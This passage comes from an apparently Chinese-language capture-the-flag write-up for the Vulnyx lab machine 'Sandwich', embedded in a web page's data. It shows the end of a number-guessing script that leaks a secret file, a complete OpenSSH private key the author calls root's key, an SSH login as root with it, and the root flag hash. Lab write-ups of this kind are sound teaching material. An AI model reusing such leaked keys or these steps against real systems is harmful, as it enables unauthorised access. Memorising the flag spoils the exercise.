class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n  ATTEMPTS_MADE=$((ATTEMPTS_MADE + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))\n\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ \u003cspan class=\"hljs-variable\"\u003e$GUESS\u003c/span\u003e -lt \u003cspan class=\"hljs-variable\"\u003e$NUMBER\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Your guess is too low.\"\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eelif\u003c/span\u003e [ \u003cspan class=\"hljs-variable\"\u003e$GUESS\u003c/span\u003e -gt \u003cspan class=\"hljs-variable\"\u003e$NUMBER\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Your guess is too high.\"\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ \u003cspan class=\"hljs-variable\"\u003e$GUESS\u003c/span\u003e -eq \u003cspan class=\"hljs-variable\"\u003e$NUMBER\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n  /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Good job, \u003cspan class=\"hljs-variable\"\u003e$NAME\u003c/span\u003e! You guessed my number in \u003cspan class=\"hljs-variable\"\u003e$ATTEMPTS_MADE\u003c/span\u003e attempts!\"\u003c/span\u003e\n  /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Here's your reward:\"\u003c/span\u003e\n  /bin/cat \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$SECRET_FILE\u003c/span\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e\n  /bin/echo \u003cspan class=\"hljs-string\"\u003e\"No, the number I was thinking of was \u003cspan class=\"hljs-variable\"\u003e$NUMBER\u003c/span\u003e.\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e硬刚\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e这个是 \u003ccode\u003eroot\u003c/code\u003e 的私钥，直接利用即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich ssh root@192.168.56.60 -i id_rsa \nLinux sandwich 6.1.0-32-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 30 20:14:35 2025 from 192.168.1.181\nroot@sandwich:~# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@sandwich:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.txt \na4e728e6ffc502beea7570a75348af44\n\u003c/code\u003e\u003c/pre\u003e","title":"Vulnyx - Shadwich","date":"2025-05-14","updated":"2025-05-14","tags":["Vulnyx","Linux靶机","Brute","逻辑漏洞"],"categories":"靶机","comments":true}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnyxShadwich"},"buildId":"F8SJ1HVtHRD6RHoOjYTwW","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>